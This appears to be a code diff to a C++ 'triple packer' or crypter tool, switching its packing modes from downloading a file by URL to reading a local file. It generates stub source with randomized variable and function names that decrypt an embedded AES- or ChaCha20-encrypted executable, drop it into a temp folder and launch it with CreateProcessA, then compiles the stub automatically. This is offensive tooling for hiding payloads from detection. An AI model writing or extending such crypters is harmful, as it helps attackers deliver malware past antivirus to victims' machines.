@@ -1,11 +1,33 @@
-        std::cout << "Enter URL to download and pack: ";
-        std::getline(std::cin, url);
-
-        std::vector<uint8_t> fileData;
-        if (!downloadFile(url, fileData)) {
-            std::cout << "❌ Failed to download file from URL" << std::endl;
+        if (!outFile) {
+            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
             return;
         }
+
+        outFile << sourceCode;
+        outFile.close();
+
+        std::cout << "✅ URL Triple Packer generated successfully!" << std::endl;
+        std::cout << "📁 Output: " << outputFile << std::endl;
+        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
+        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
+        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
+        std::cout << "🌐 Source URL: " << url << std::endl;
+        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o url_packed_triple.exe" << std::endl;
+    }
+    // Local Crypto Service - AES (option 13)
+    void localCryptoServiceAES() {
+        std::string inputFile;
+        std::cout << "Enter local file path to pack: ";
+        std::getline(std::cin, inputFile);
+
+        std::ifstream file(inputFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
+            return;
+        }
+
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
 
         // Generate AES key
         auto keys = generateKeys();
@@ -109,9 +131,9 @@ int main() {
 #ifdef _WIN32
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
-    std::string tempFile = std::string(tempPath) + "\\upx_url_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
+    std::string tempFile = std::string(tempPath) + "\\upx_local_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
 #else
-    std::string tempFile = "/tmp/upx_url_temp_" + std::to_string(getpid());
+    std::string tempFile = "/tmp/upx_local_temp_" + std::to_string(getpid());
 #endif
     
     std::ofstream outFile(tempFile, std::ios::binary);
@@ -139,7 +161,8 @@ int main() {
 })";
 
         // Save the packed executable source
-        std::string outputFile = "url_packed_aes_" + std::to_string(rng() % 10000) + ".cpp";
+        std::filesystem::path inputPath(inputFile);
+        std::string outputFile = "local_packed_aes_" + inputPath.stem().string() + "_" + std::to_string(rng() % 10000) + ".cpp";
         
         std::ofstream outFile(outputFile);
         if (!outFile) {
@@ -150,28 +173,31 @@ int main() {
         outFile << sourceCode;
         outFile.close();
 
-        std::cout << "✅ URL AES Packer generated successfully!" << std::endl;
+        std::cout << "✅ Local AES Packer generated successfully!" << std::endl;
         std::cout << "📁 Output: " << outputFile << std::endl;
         std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
         std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
-        std::cout << "🌐 Source URL: " << url << std::endl;
-        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o url_packed_aes.exe" << std::endl;
+        std::cout << "📂 Source file: " << inputFile << std::endl;
+        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o local_packed_aes_" << inputPath.stem().string() << ".exe" << std::endl;
         
         // Auto-compile the generated source file
         autoCompile(outputFile);
     }
 
-    // URL Pack File - ChaCha20 (option 11)
-    void urlPackFileChaCha20() {
-        std::string url;
-        std::cout << "Enter URL to download and pack: ";
-        std::getline(std::cin, url);
+    // Local Crypto Service - ChaCha20 (option 14)
+    void localCryptoServiceChaCha20() {
+        std::string inputFile;
+        std::cout << "Enter local file path to pack: ";
+        std::getline(std::cin, inputFile);
 
-        std::vector<uint8_t> fileData;
-        if (!downloadFile(url, fileData)) {
-            std::cout << "❌ Failed to download file from URL" << std::endl;
+        std::ifstream file(inputFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
             return;
         }
+
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
 
         // Generate ChaCha20 key and nonce
         auto keys = generateKeys();
@@ -294,29 +320,3 @@ int main() {
     
     std::vector<unsigned char> )" + bufferVar + R"(()" + payloadVar + R"(, )" + payloadVar + R"( + )" + sizeVar + R"();
     std::vector<unsigned char> keyBytes = )" + keyVar + R"(FromDecimal()" + keyVar + R"();
-    std::vector<unsigned char> nonceBytes = )" + keyVar + R"(FromDecimal()" + nonceVar + R"();
-    
-    )" + funcName + R"(()" + bufferVar + R"(, keyBytes.data(), nonceBytes.data());
-    
-#ifdef _WIN32
-    char tempPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempPath);
-    std::string tempFile = std::string(tempPath) + "\\upx_url_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
-#else
-    std::string tempFile = "/tmp/upx_url_temp_" + std::to_string(getpid());
-#endif
-    
-    std::ofstream outFile(tempFile, std::ios::binary);
-    if (!outFile) return 1;
-    
-    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
-    outFile.close();
-    
-#ifdef _WIN32
-    STARTUPINFOA si = {sizeof(si)};
-    PROCESS_INFORMATION pi;
-    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
